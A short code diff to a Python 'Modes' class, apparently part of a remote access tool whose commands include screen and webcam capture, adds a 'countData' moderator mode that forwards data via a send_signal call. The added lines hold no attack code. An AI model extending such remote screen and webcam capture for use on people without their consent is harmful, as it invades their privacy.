@@ -34,6 +34,8 @@ class Modes:
             'scriptingMode': self.scriptingMode,
             'getScreen': self.getScreen,
             'getWebcam': self.getWebcam,
+            # Moderators Modes
+            'countData': self.countData,
         }
 
     def check_mode(self, data):
@@ -130,3 +132,6 @@ class Modes:
         :return:
         '''
         self.tables.update_moderators(data)
+
+    def countData(self, data):
+        self.moderat.send_signal(data)
